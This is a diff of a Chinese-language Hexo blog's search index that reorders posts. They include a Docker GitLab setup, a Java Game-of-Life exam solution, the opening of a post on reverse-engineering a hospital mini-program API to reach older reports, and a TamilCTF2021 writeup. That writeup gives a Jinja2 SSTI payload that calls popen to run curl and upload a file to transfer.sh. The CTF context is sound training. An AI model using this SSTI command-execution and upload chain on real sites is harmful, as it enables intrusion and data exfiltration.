@@ -512,6 +512,41 @@ plaintext.map((x, i) =&gt; &#123;
       </tags>
   </entry>
   <entry>
+    <title>Docker搭建Gitlab仓库</title>
+    <url>/posts/151510421/</url>
+    <content><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><ol>
+<li>拉取Gitlab镜像<br><code>docker pull gitlab/gitlab-ce</code></li>
+</ol>
+<img data-src="/posts/151510421/pasted-1.png" class="">
+
+<ol start="2">
+<li><p>创建文件夹<br><code>mkdir gitlab</code></p>
+<span id="more"></span>
+</li>
+<li><p>创建容器</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d  -p 8001:8001 -p 222:22 --name gitlab   \</span><br><span class="line">    -v <span class="string">&quot;<span class="subst">$(pwd)</span>/gitlab/config&quot;</span>:/etc/gitlab \</span><br><span class="line">    -v <span class="string">&quot;<span class="subst">$(pwd)</span>/gitlab/logs&quot;</span>:/var/log/gitlab \</span><br><span class="line">    -v <span class="string">&quot;<span class="subst">$(pwd)</span>/gitlab/data&quot;</span>:/var/opt/gitlab \</span><br><span class="line">    --restart=always gitlab/gitlab-ce</span><br></pre></td></tr></table></figure></li>
+</ol>
+<div class="note info">
+            <p>也可以将8001修改为其他端口</p>
+          </div>
+
+<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><ol>
+<li><p>修改配置文件<br><code>vi gitlab/config/gitlab.rb</code><br><code>external_url &#39;http://www.xxx.com:8001&#39;</code> or <code>external_url &#39;http://&#123;ip&#125;:8001&#39;</code></p>
+</li>
+<li><p>重启容器<br><code>docker restart gitlab</code></p>
+</li>
+</ol>
+<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><ol>
+<li>首次打开时需要设置管理员密码<img data-src="/posts/151510421/pasted-2.jpg" class=""></li>
+<li>查看Clone信息<img data-src="/posts/151510421/pasted-0.png" class=""></li>
+</ol>
+<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
+      <tags>
+        <tag>Gitlab</tag>
+        <tag>Docker</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>DEADFACECTF Writeup</title>
     <url>/posts/2879210530/</url>
     <content><![CDATA[<h1 id="Poor-MEAGAN"><a href="#Poor-MEAGAN" class="headerlink" title="Poor MEAGAN!"></a>Poor MEAGAN!</h1><p><em>Oh, NO! Poor Megan! She&#39;s just been bitten by a ZOMBIE! We can save her if we act fast, but the formula for the antidote has been scrambled somehow. Figure out how to unscramble &gt;the formula to save Megan from certain zombification. Enter the answer as flag{here-is-the-answer}.</em></p>
@@ -950,41 +985,6 @@ MD5 (lytton-crypt.exe) = 9cb9b11484369b95ce35904c691a5b28
       <tags>
         <tag>CTF</tag>
         <tag>DEADFACECTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Docker搭建Gitlab仓库</title>
-    <url>/posts/151510421/</url>
-    <content><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><ol>
-<li>拉取Gitlab镜像<br><code>docker pull gitlab/gitlab-ce</code></li>
-</ol>
-<img data-src="/posts/151510421/pasted-1.png" class="">
-
-<ol start="2">
-<li><p>创建文件夹<br><code>mkdir gitlab</code></p>
-<span id="more"></span>
-</li>
-<li><p>创建容器</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d  -p 8001:8001 -p 222:22 --name gitlab   \</span><br><span class="line">    -v <span class="string">&quot;<span class="subst">$(pwd)</span>/gitlab/config&quot;</span>:/etc/gitlab \</span><br><span class="line">    -v <span class="string">&quot;<span class="subst">$(pwd)</span>/gitlab/logs&quot;</span>:/var/log/gitlab \</span><br><span class="line">    -v <span class="string">&quot;<span class="subst">$(pwd)</span>/gitlab/data&quot;</span>:/var/opt/gitlab \</span><br><span class="line">    --restart=always gitlab/gitlab-ce</span><br></pre></td></tr></table></figure></li>
-</ol>
-<div class="note info">
-            <p>也可以将8001修改为其他端口</p>
-          </div>
-
-<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><ol>
-<li><p>修改配置文件<br><code>vi gitlab/config/gitlab.rb</code><br><code>external_url &#39;http://www.xxx.com:8001&#39;</code> or <code>external_url &#39;http://&#123;ip&#125;:8001&#39;</code></p>
-</li>
-<li><p>重启容器<br><code>docker restart gitlab</code></p>
-</li>
-</ol>
-<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><ol>
-<li>首次打开时需要设置管理员密码<img data-src="/posts/151510421/pasted-2.jpg" class=""></li>
-<li>查看Clone信息<img data-src="/posts/151510421/pasted-0.png" class=""></li>
-</ol>
-<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
-      <tags>
-        <tag>Gitlab</tag>
-        <tag>Docker</tag>
       </tags>
   </entry>
   <entry>
@@ -3037,31 +3037,6 @@ im.save(&#39;ans.png&#39;)
       </tags>
   </entry>
   <entry>
-    <title>TamilCTF2021 Writeup</title>
-    <url>/posts/2827311957/</url>
-    <content><![CDATA[<h1 id="Open-Flag"><a href="#Open-Flag" class="headerlink" title="Open Flag"></a>Open Flag</h1><hr>
-<p>访问题目中给出的链接,发现是一个登录页面<br><img data-src="../../CTF/TamilCTF2021/Web/images/login.png" alt="Open Flag" style="zoom:80%;" /><br>随便输入一个用户名和密码直接可以登录,提示我们flag文件的路径是<code>./flag.jpg</code>.<br>F12看源码发现注释中会显示刚才登录所用的用户名,猜测存在SSTI漏洞,直接用注入代码作为用户名登录即可<br><img data-src="../../CTF/TamilCTF2021/Web/images/image-20211119203608270.jpg" alt="image-20211119203608270" style="zoom:70%;" /></p>
-<p>使用下列代码作为用户名登录,查看当前已加载的模块;删掉HTML的注释标记<code>&lt;!--</code>,找到<code>os._wrap_close</code>模块所在的索引为132,借助于<code>popen</code>函数可以直接执行系统命令</p>
-<pre><code class="python">&#123;&#123;"".__class__.__bases__[0].__subclasses__()&#125;&#125;
-</code></pre>
-<p><img data-src="/../../CTF/TamilCTF2021/Web/images/image-20211119212248483.png" alt="image-20211119212248483"></p>
-<p>使用<code>curl</code>命令将<code>flag.jpg</code>文件上传至<a href="http://transfer.sh/">transfer.sh</a></p>
-<pre><code class="python">&#123;&#123;"".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('curl --upload-file ./flag.jpg http://transfer.sh/flag.jpg').read()&#125;&#125;
-</code></pre>
-<p>在HTML注释中找到文件上传后的URL<code>http://transfer.sh/bDGBlw/flag.jpg</code><br><img data-src="/../../CTF/TamilCTF2021/Web/images/image-20211119204635015.png" alt="image-20211119204635015"></p>
-<img data-src="../../CTF/TamilCTF2021/Web/images/flag.jpg" alt="Open Flag" style="zoom:80%;" />
-
-<p><strong>flag:</strong><code>TamilCTF&#123;SsTi_Is_VeRy_DaNgErOuS&#125;</code></p>
-<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>TamilCTF</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>ThinkServer RD650安装Ubuntu Server 16.04</title>
     <url>/posts/560540611/</url>
     <content><![CDATA[<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ol>
@@ -3124,6 +3099,31 @@ im.save(&#39;ans.png&#39;)
       <tags>
         <tag>Linux</tag>
         <tag>Ubuntu</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>TamilCTF2021 Writeup</title>
+    <url>/posts/2827311957/</url>
+    <content><![CDATA[<h1 id="Open-Flag"><a href="#Open-Flag" class="headerlink" title="Open Flag"></a>Open Flag</h1><hr>
+<p>访问题目中给出的链接,发现是一个登录页面<br><img data-src="../../CTF/TamilCTF2021/Web/images/login.png" alt="Open Flag" style="zoom:80%;" /><br>随便输入一个用户名和密码直接可以登录,提示我们flag文件的路径是<code>./flag.jpg</code>.<br>F12看源码发现注释中会显示刚才登录所用的用户名,猜测存在SSTI漏洞,直接用注入代码作为用户名登录即可<br><img data-src="../../CTF/TamilCTF2021/Web/images/image-20211119203608270.jpg" alt="image-20211119203608270" style="zoom:70%;" /></p>
+<p>使用下列代码作为用户名登录,查看当前已加载的模块;删掉HTML的注释标记<code>&lt;!--</code>,找到<code>os._wrap_close</code>模块所在的索引为132,借助于<code>popen</code>函数可以直接执行系统命令</p>
+<pre><code class="python">&#123;&#123;"".__class__.__bases__[0].__subclasses__()&#125;&#125;
+</code></pre>
+<p><img data-src="/../../CTF/TamilCTF2021/Web/images/image-20211119212248483.png" alt="image-20211119212248483"></p>
+<p>使用<code>curl</code>命令将<code>flag.jpg</code>文件上传至<a href="http://transfer.sh/">transfer.sh</a></p>
+<pre><code class="python">&#123;&#123;"".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('curl --upload-file ./flag.jpg http://transfer.sh/flag.jpg').read()&#125;&#125;
+</code></pre>
+<p>在HTML注释中找到文件上传后的URL<code>http://transfer.sh/bDGBlw/flag.jpg</code><br><img data-src="/../../CTF/TamilCTF2021/Web/images/image-20211119204635015.png" alt="image-20211119204635015"></p>
+<img data-src="../../CTF/TamilCTF2021/Web/images/flag.jpg" alt="Open Flag" style="zoom:80%;" />
+
+<p><strong>flag:</strong><code>TamilCTF&#123;SsTi_Is_VeRy_DaNgErOuS&#125;</code></p>
+<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>TamilCTF</tag>
       </tags>
   </entry>
   <entry>
@@ -3832,9 +3832,43 @@ def main(q: Optional[str] = None):
       </tags>
   </entry>
   <entry>
+    <title>期末考试_细胞自动机</title>
+    <url>/posts/6200/</url>
+    <content><![CDATA[<h2 id="题目内容："><a href="#题目内容：" class="headerlink" title="题目内容："></a>题目内容：</h2><p>这是细胞自动机的非图形版本。细胞自动机是指在一个二维网格内，每一个网格是一个细胞。每个细胞有活和死两种状态。<br>初始时刻，有些细胞是活的，有些细胞是死的。自动机的每一步，根据每个细胞周围8个格子内的其他细胞的生存情况决定这个细胞下一步是否存活。具体的规则如下：</p>
+<ul>
+<li>如果该细胞现在是活的，并且周围8个格子中有2或3个活着的细胞，则继续存活；如果周围8个格子中的活着的细胞数量少于2个或多于3个，则死亡；</li>
+<li>如果该细胞现在是死的，并且周围8个格子中正好有3个活着的细胞，则细胞复活。</li>
+<li>位于整个网格边缘和顶角的细胞，它的周围细胞可能少于8个。即越过网格的边界不再有细胞。</li>
+<li>每个细胞的生死变化，都不会影响当前这一步周围的细胞，只会在下一步表现出来。</li>
+</ul>
+<p>提示：课程中的代码与上一句描述不同。</p>
+<span id="more"></span>
+<h2 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式:"></a>输入格式:</h2><p>首先输入两个正整数，范围为[3,102]，依次表示网格的宽度和高度。<br>然后输入多组正整数，依次表示一个活着的细胞的网格位置，每组数字中，第一个表示行号，第二个表示列号，均从0开始编号。<br>最后，以“-1 -1”表示不再有活着的细胞。-1 -1不是有效的位置。<br>然后，以一个正整数，范围为[1,10000]，表示要求细胞自动机执行的步数。</p>
+<h2 id="输出格式："><a href="#输出格式：" class="headerlink" title="输出格式："></a>输出格式：</h2><p>输出一个正整数，表示执行完毕后，剩下的活着的细胞的数量。</p>
+<h2 id="输入样例："><a href="#输入样例：" class="headerlink" title="输入样例："></a>输入样例：</h2><div class="note default no-icon"><p>3 3
+1 1 1 2 0 1 2 1
+-1 -1
+1
+</p></div>
+## 输出样例：
+<div class="note default no-icon"><p>7
+</p></div>
+
+<p><strong>时间限制：500ms内存限制：32000kb</strong></p>
+<h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> 面向对象程序设计_Java语言_翁恺;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">The_final_exam</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="type">int</span> times;</span><br><span class="line">	<span class="keyword">private</span> <span class="type">int</span> width;</span><br><span class="line">	<span class="keyword">private</span> <span class="type">int</span> height;</span><br><span class="line">	<span class="type">int</span> old_field[][];</span><br><span class="line">	<span class="type">int</span> new_field[][];</span><br><span class="line"></span><br><span class="line">	<span class="type">Scanner</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">void</span> <span class="title function_">Init</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		width = in.nextInt();</span><br><span class="line">		height = in.nextInt();</span><br><span class="line">		old_field = <span class="keyword">new</span> <span class="title class_">int</span>[height+<span class="number">2</span>][width+<span class="number">2</span>];</span><br><span class="line">		new_field = <span class="keyword">new</span> <span class="title class_">int</span>[height+<span class="number">2</span>][width+<span class="number">2</span>];</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// 初始化为0</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; height+<span class="number">2</span>; i++)</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; width+<span class="number">2</span>; j++)</span><br><span class="line">			&#123;</span><br><span class="line">				old_field[i][j] = <span class="number">0</span>;</span><br><span class="line">				old_field[i][j] = <span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">//读入活的细胞的位置</span></span><br><span class="line">		<span class="keyword">while</span>(<span class="literal">true</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="type">int</span> i=in.nextInt();</span><br><span class="line">			<span class="type">int</span> j=in.nextInt();</span><br><span class="line">			<span class="keyword">if</span>(i==-<span class="number">1</span>&amp;&amp;j==-<span class="number">1</span>)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			old_field[i+<span class="number">1</span>][j+<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">			new_field[i+<span class="number">1</span>][j+<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//读入执行步数</span></span><br><span class="line">		times = in.nextInt();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> k=<span class="number">0</span>;k&lt;times;k++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;height+<span class="number">1</span>;i++)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;width+<span class="number">1</span>;j++)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="type">int</span> count=getNeighbor(i, j);</span><br><span class="line">					<span class="keyword">if</span>(old_field[i][j]==<span class="number">0</span>)</span><br><span class="line">					&#123;</span><br><span class="line">						<span class="keyword">if</span>(count==<span class="number">3</span>)<span class="comment">//细胞复活</span></span><br><span class="line">							new_field[i][j]=<span class="number">1</span>;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">else</span></span><br><span class="line">					&#123;</span><br><span class="line">						<span class="keyword">if</span>(!(count==<span class="number">2</span>||count==<span class="number">3</span>))<span class="comment">//细胞死亡</span></span><br><span class="line">							new_field[i][j]=<span class="number">0</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">//copy</span></span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; height+<span class="number">1</span>; i++)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; width+<span class="number">1</span>; j++)</span><br><span class="line">				&#123;</span><br><span class="line">					old_field[i][j] = new_field[i][j];</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="type">int</span> <span class="title function_">getNeighbor</span><span class="params">(<span class="type">int</span> i,<span class="type">int</span> j)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//计算位置为i，j的细胞周围活的细胞的数量</span></span><br><span class="line">		<span class="type">int</span> temp=<span class="number">0</span>;</span><br><span class="line">		temp+=old_field[i-<span class="number">1</span>][j]+old_field[i+<span class="number">1</span>][j]+old_field[i][j-<span class="number">1</span>]+old_field[i][j+<span class="number">1</span>];</span><br><span class="line">		temp+=old_field[i-<span class="number">1</span>][j-<span class="number">1</span>]+old_field[i-<span class="number">1</span>][j+<span class="number">1</span>]+old_field[i+<span class="number">1</span>][j-<span class="number">1</span>]+old_field[i+<span class="number">1</span>][j+<span class="number">1</span>];</span><br><span class="line">		<span class="keyword">return</span> temp;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="type">int</span> <span class="title function_">Count</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//计算活着的细胞的数量</span></span><br><span class="line">		<span class="type">int</span> count=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; height+<span class="number">1</span>; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt; width+<span class="number">1</span>; j++)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span>(old_field[i][j]==<span class="number">1</span>)</span><br><span class="line">					count++;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> count;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">void</span> <span class="title function_">Test</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		Init();</span><br><span class="line">		run();</span><br><span class="line">		System.out.println(Count());</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		<span class="keyword">new</span> <span class="title class_">The_final_exam</span>().Test();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h2><p>简单模拟题....<br>用两个二维数组来存细胞，细胞自动机每执行一次，遍历数组1一次，对数组1中每个细胞的状态进行判断，计算周围活着的细胞的数量，然后对数组2进行相应的操作，所有操作完成后将数组2拷贝至数组1。<br>这里判断细胞周围活着的细胞数量时有一个小技巧，不需要对每种边界情况进行处理,可以将数组开大点，下标从1开始使用，相当于在所使用的有效数组空间外面绕了一圈，避免数组越界。</p>
+<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
+      <categories>
+        <category>面向对象程序设计_Java语言_翁恺</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>某医院小程序接口逆向分析</title>
     <url>/posts/3592944982/</url>
-    <content><![CDATA[<h1 id="某医院小程序接口逆向分析"><a href="#某医院小程序接口逆向分析" class="headerlink" title="某医院小程序接口逆向分析"></a>某医院小程序接口逆向分析</h1><p>最近使用某医院小程序时，发现只能查询最近半年的检查报告。那么有没有可能通过修改请求参数，获取到更早时间的检查报告呢？</p>
+    <content><![CDATA[<h2 id="某医院小程序接口逆向分析"><a href="#某医院小程序接口逆向分析" class="headerlink" title="某医院小程序接口逆向分析"></a>某医院小程序接口逆向分析</h2><p>最近使用某医院小程序时，发现只能查询最近半年的检查报告。那么有没有可能通过修改请求参数，获取到更早时间的检查报告呢？</p>
 <span id="more"></span>
 
 <h2 id="环境-工具"><a href="#环境-工具" class="headerlink" title="环境&amp;工具"></a>环境&amp;工具</h2><ul>
@@ -3921,40 +3955,6 @@ def main(q: Optional[str] = None):
         <tag>小程序</tag>
         <tag>Proxifier</tag>
         <tag>Burp Suite</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>期末考试_细胞自动机</title>
-    <url>/posts/6200/</url>
-    <content><![CDATA[<h2 id="题目内容："><a href="#题目内容：" class="headerlink" title="题目内容："></a>题目内容：</h2><p>这是细胞自动机的非图形版本。细胞自动机是指在一个二维网格内，每一个网格是一个细胞。每个细胞有活和死两种状态。<br>初始时刻，有些细胞是活的，有些细胞是死的。自动机的每一步，根据每个细胞周围8个格子内的其他细胞的生存情况决定这个细胞下一步是否存活。具体的规则如下：</p>
-<ul>
-<li>如果该细胞现在是活的，并且周围8个格子中有2或3个活着的细胞，则继续存活；如果周围8个格子中的活着的细胞数量少于2个或多于3个，则死亡；</li>
-<li>如果该细胞现在是死的，并且周围8个格子中正好有3个活着的细胞，则细胞复活。</li>
-<li>位于整个网格边缘和顶角的细胞，它的周围细胞可能少于8个。即越过网格的边界不再有细胞。</li>
-<li>每个细胞的生死变化，都不会影响当前这一步周围的细胞，只会在下一步表现出来。</li>
-</ul>
-<p>提示：课程中的代码与上一句描述不同。</p>
-<span id="more"></span>
-<h2 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式:"></a>输入格式:</h2><p>首先输入两个正整数，范围为[3,102]，依次表示网格的宽度和高度。<br>然后输入多组正整数，依次表示一个活着的细胞的网格位置，每组数字中，第一个表示行号，第二个表示列号，均从0开始编号。<br>最后，以“-1 -1”表示不再有活着的细胞。-1 -1不是有效的位置。<br>然后，以一个正整数，范围为[1,10000]，表示要求细胞自动机执行的步数。</p>
-<h2 id="输出格式："><a href="#输出格式：" class="headerlink" title="输出格式："></a>输出格式：</h2><p>输出一个正整数，表示执行完毕后，剩下的活着的细胞的数量。</p>
-<h2 id="输入样例："><a href="#输入样例：" class="headerlink" title="输入样例："></a>输入样例：</h2><div class="note default no-icon"><p>3 3
-1 1 1 2 0 1 2 1
--1 -1
-1
-</p></div>
-## 输出样例：
-<div class="note default no-icon"><p>7
-</p></div>
-
-<p><strong>时间限制：500ms内存限制：32000kb</strong></p>
-<h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> 面向对象程序设计_Java语言_翁恺;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">The_final_exam</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="type">int</span> times;</span><br><span class="line">	<span class="keyword">private</span> <span class="type">int</span> width;</span><br><span class="line">	<span class="keyword">private</span> <span class="type">int</span> height;</span><br><span class="line">	<span class="type">int</span> old_field[][];</span><br><span class="line">	<span class="type">int</span> new_field[][];</span><br><span class="line"></span><br><span class="line">	<span class="type">Scanner</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">void</span> <span class="title function_">Init</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		width = in.nextInt();</span><br><span class="line">		height = in.nextInt();</span><br><span class="line">		old_field = <span class="keyword">new</span> <span class="title class_">int</span>[height+<span class="number">2</span>][width+<span class="number">2</span>];</span><br><span class="line">		new_field = <span class="keyword">new</span> <span class="title class_">int</span>[height+<span class="number">2</span>][width+<span class="number">2</span>];</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// 初始化为0</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; height+<span class="number">2</span>; i++)</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; width+<span class="number">2</span>; j++)</span><br><span class="line">			&#123;</span><br><span class="line">				old_field[i][j] = <span class="number">0</span>;</span><br><span class="line">				old_field[i][j] = <span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">//读入活的细胞的位置</span></span><br><span class="line">		<span class="keyword">while</span>(<span class="literal">true</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="type">int</span> i=in.nextInt();</span><br><span class="line">			<span class="type">int</span> j=in.nextInt();</span><br><span class="line">			<span class="keyword">if</span>(i==-<span class="number">1</span>&amp;&amp;j==-<span class="number">1</span>)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			old_field[i+<span class="number">1</span>][j+<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">			new_field[i+<span class="number">1</span>][j+<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//读入执行步数</span></span><br><span class="line">		times = in.nextInt();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> k=<span class="number">0</span>;k&lt;times;k++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;height+<span class="number">1</span>;i++)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;width+<span class="number">1</span>;j++)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="type">int</span> count=getNeighbor(i, j);</span><br><span class="line">					<span class="keyword">if</span>(old_field[i][j]==<span class="number">0</span>)</span><br><span class="line">					&#123;</span><br><span class="line">						<span class="keyword">if</span>(count==<span class="number">3</span>)<span class="comment">//细胞复活</span></span><br><span class="line">							new_field[i][j]=<span class="number">1</span>;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">else</span></span><br><span class="line">					&#123;</span><br><span class="line">						<span class="keyword">if</span>(!(count==<span class="number">2</span>||count==<span class="number">3</span>))<span class="comment">//细胞死亡</span></span><br><span class="line">							new_field[i][j]=<span class="number">0</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">//copy</span></span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; height+<span class="number">1</span>; i++)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; width+<span class="number">1</span>; j++)</span><br><span class="line">				&#123;</span><br><span class="line">					old_field[i][j] = new_field[i][j];</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="type">int</span> <span class="title function_">getNeighbor</span><span class="params">(<span class="type">int</span> i,<span class="type">int</span> j)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//计算位置为i，j的细胞周围活的细胞的数量</span></span><br><span class="line">		<span class="type">int</span> temp=<span class="number">0</span>;</span><br><span class="line">		temp+=old_field[i-<span class="number">1</span>][j]+old_field[i+<span class="number">1</span>][j]+old_field[i][j-<span class="number">1</span>]+old_field[i][j+<span class="number">1</span>];</span><br><span class="line">		temp+=old_field[i-<span class="number">1</span>][j-<span class="number">1</span>]+old_field[i-<span class="number">1</span>][j+<span class="number">1</span>]+old_field[i+<span class="number">1</span>][j-<span class="number">1</span>]+old_field[i+<span class="number">1</span>][j+<span class="number">1</span>];</span><br><span class="line">		<span class="keyword">return</span> temp;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="type">int</span> <span class="title function_">Count</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//计算活着的细胞的数量</span></span><br><span class="line">		<span class="type">int</span> count=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; height+<span class="number">1</span>; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt; width+<span class="number">1</span>; j++)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span>(old_field[i][j]==<span class="number">1</span>)</span><br><span class="line">					count++;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> count;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">void</span> <span class="title 